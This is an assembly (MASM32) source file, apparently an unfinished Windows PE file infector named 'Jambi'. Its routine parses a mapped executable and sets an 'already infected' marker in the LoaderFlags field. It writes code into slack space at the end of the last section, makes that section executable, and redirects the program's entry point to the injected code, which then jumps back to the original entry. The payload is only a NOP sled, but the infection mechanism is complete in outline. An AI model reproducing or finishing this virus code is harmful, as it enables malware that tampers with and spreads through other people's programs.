.386
.model flat, stdcall
option casemap:none
 
include		\masm32\macros\ucmacros.asm
 
include		\masm32\include\windows.inc 
include		\masm32\include\kernel32.inc 
includelib	\masm32\lib\kernel32.lib 
 
include		\masm32\include\user32.inc 
includelib	\masm32\lib\user32.lib	

memalign MACRO reg, number
dec number
add reg, number
inc number
imul number, -1
and reg, number
ENDM

;add_section   proto :PUCHAR, :DWORD
; void add_section(PUCHAR, int);

.code

add_section:;   proc   file_map:PUCHAR
	push ebp
	mov	 ebp, esp

	jmp post_data
	wstr_title				db "Jambi", 0
	wstr_dos_header_error	db "Invalid DOS header.", 0
	wstr_win_header_error	db "Invalid WIN header.", 0
	wstr_infected_error		db "Binary Already infected.", 0

	post_data:

	; FIXME : add payload size to the mapping?
	mov eax, [ebp + 8]	; recuperer le fichier mappe

;	pusha ; save the exact state of the program ? FIXME

	; FIXME : debug checks
	assume eax: ptr IMAGE_DOS_HEADER
	.if [eax].e_magic != IMAGE_DOS_SIGNATURE
		invoke MessageBox, NULL, addr wstr_dos_header_error, addr wstr_title, MB_OK
		jmp exit
	.endif
	add eax, [eax].e_lfanew

	assume eax: ptr IMAGE_NT_HEADERS
	.if [eax].Signature != IMAGE_NT_SIGNATURE
		invoke MessageBox, NULL, addr wstr_win_header_error, addr wstr_title, MB_OK
		jmp exit
	.endif
	mov ebx, eax
	; ENDFIXME

; --------------------------------------------------------------------------------------------------

	; jump the PE headers (IMAGE_NT_HEADERS)
	add eax, sizeof IMAGE_NT_HEADERS

	; ebx == PE_HEADER, IMAGE_NT_HEADERS
	; eax == IMAGE_SECTION_HEADERS

	assume ebx: ptr IMAGE_NT_HEADERS

	; check for loadFlags field -> infected or not?
	.if [ebx].OptionalHeader.LoaderFlags == 46554342
		invoke MessageBox, NULL, addr wstr_infected_error, addr wstr_title, MB_OK
		jmp exit
	.endif
	mov [ebx].OptionalHeader.LoaderFlags, 46554342


	; look for the last section, the last is the one with the biggest VirtualAddress
	; FIXME : placer a la fin de .code si possible?
	mov ecx, 0
	mov cx, [ebx].FileHeader.NumberOfSections

	assume eax: ptr IMAGE_SECTION_HEADER
	mov esi, 0
	.while ecx > 0
		.if [eax].VirtualAddress > esi
			mov esi, [eax].VirtualAddress
			mov edi, eax
		.endif
		dec ecx
		add eax, SIZEOF IMAGE_SECTION_HEADER
	.endw

	; edi == last section

; --------------------------------------------------------------------------------------------------

	; extend the general file size in the [ebx].FileHeader.SizeOfImage
;	mov ecx, [ebx].OptionalHeader.SizeOfImage
;	add ecx, 2048 + SIZEOF DWORD ; FIXME : sizeof payload + SIZEOF DWORD
;	mov edx, [ebx].OptionalHeader.SectionAlignment
;	memalign ecx, edx
;	mov [ebx].OptionalHeader.SizeOfImage, ecx

; --------------------------------------------------------------------------------------------------

	; save the entry point of the prg
	mov esi, [ebx].OptionalHeader.AddressOfEntryPoint
;	add esi, [ebx].OptionalHeader.ImageBase

; --------------------------------------------------------------------------------------------------

	assume edi: ptr IMAGE_SECTION_HEADER
	; preparing to write the payload
	mov edx, [ebp + 8] ; from the beginning of the mapped file
	add edx, [edi].PointerToRawData ; go to the section address
	add edx, [edi].SizeOfRawData ; go to the end of the section
	dec edx ; don't go to far

	; get to the right place
	mov ecx, edx
	.while byte ptr [edx] == 0 || byte ptr [edx] == 90h
		dec edx
	.endw
	sub ecx, edx ; compute the difference
	inc edx ; copy right after the code

	push ecx

	; copy the payload at the right place
	
	; FIXME : NOP Sledge debug
	mov ecx, 0
	.while ecx < 10
		mov byte ptr [edx], 90h
		inc edx
		inc ecx
	.endw
	; ENDFIXME

	pop ecx

	; modifying the entry point of the prg, vadress
	mov eax, [edi].VirtualAddress ; the vadress of the section ; FIXME : align it
	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
	sub eax, ecx
	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing

	; copy the real entry point adress
	mov byte ptr [edx], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
	add [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE

	; compute shellcode end - entrypoint and write it
	; eax == VirtualAddressOfShellCode
	add eax, 15 ; NOP * 10 + JMP 
	; eax == VirtualAddressOfShellCode end
	mov ecx, esi
	; compute the shellcode virtual offset
	sub ecx, eax
	mov [edx + 1], ecx

; --------------------------------------------------------------------------------------------------

;	assume edi: PTR IMAGE_SECTION_HEADER
	; extend the section size : FIXME : virtual AND raw?
;	mov ecx, [edi].SizeOfRawData ; align it
;	add ecx, 1000 + SIZEOF DWORD ; FIXME : sizeof payload + SIZEOF DWORD
;	mov edx, [ebx].OptionalHeader.SectionAlignment
;	memalign ecx, edx
;	mov [edi].SizeOfRawData, ecx

; --------------------------------------------------------------------------------------------------

exit:
	pop ebp
	ret
end add_section